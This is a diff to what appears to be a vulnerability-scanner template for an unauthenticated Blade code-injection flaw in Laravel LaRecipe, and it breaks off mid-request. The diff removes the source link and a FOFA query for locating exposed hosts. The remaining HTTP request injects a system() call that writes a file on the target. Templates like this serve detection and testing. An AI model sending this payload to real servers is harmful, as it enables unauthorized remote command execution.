@@ -3,12 +3,8 @@ info:
   name: Laravel LaRecipe renderBlade 末授权代码注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zht0greu2w1hvnnv'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zht0greu2w1hvnnv
-    fofa: body="LaRecipe" && body="/larecipe/" || body="/docs/1.0/overview#section"
 http:
 - raw:
   - 'GET /docs/1.0/?{{system(''echo${IFS}test231>test231.txt'')}} HTTP/1.1
